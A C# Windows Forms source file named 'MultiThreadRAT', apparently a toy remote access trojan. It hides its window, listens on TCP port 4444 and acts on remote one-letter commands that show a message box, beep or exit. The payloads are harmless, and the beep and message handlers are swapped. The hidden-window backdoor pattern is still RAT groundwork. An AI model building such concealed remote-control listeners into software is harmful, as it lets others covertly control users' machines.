using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MultiThreadRAT
{
    public partial class Form1 : Form
    {
        TcpListener tcpListener;
        Socket socketForClient;
        NetworkStream networkStream;
        StreamReader streamReader;

        // Separate theread for each command for concurrently running commands
        Thread th_message, th_beep;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
            tcpListener = new TcpListener(System.Net.IPAddress.Any, 4444);
            tcpListener.Start();
            RunServer();            
        }

        private void RunServer()
        {
            socketForClient = tcpListener.AcceptSocket();
            networkStream = new NetworkStream(socketForClient);
            streamReader = new StreamReader(networkStream);

            try
            {
                string line;

                // Command loop
                while (true)
                {
                    line = "";
                    line = streamReader.ReadLine();
                    if (line.LastIndexOf("m") >= 0)
                    {
                        th_message = new Thread(new ThreadStart(MessageCommand));
                        th_message.Start();
                    }
                    if (line.LastIndexOf("b") >= 0)
                    {
                        th_beep = new Thread(new ThreadStart(BeepCommand));
                        th_beep.Start();
                    }
                    if (line.LastIndexOf("q") >= 0)
                    {
                        throw new Exception(); // For closing
                    }
                }
            }
            catch (Exception exc)
            {
                streamReader.Close();
                networkStream.Close();
                socketForClient.Close();
                System.Environment.Exit(System.Environment.ExitCode);
            }
        }

        private void BeepCommand()
        {
            MessageBox.Show("Hello world!");
        }

        private void MessageCommand()
        {
            Console.Beep(500, 2000); 
        }
    }
}
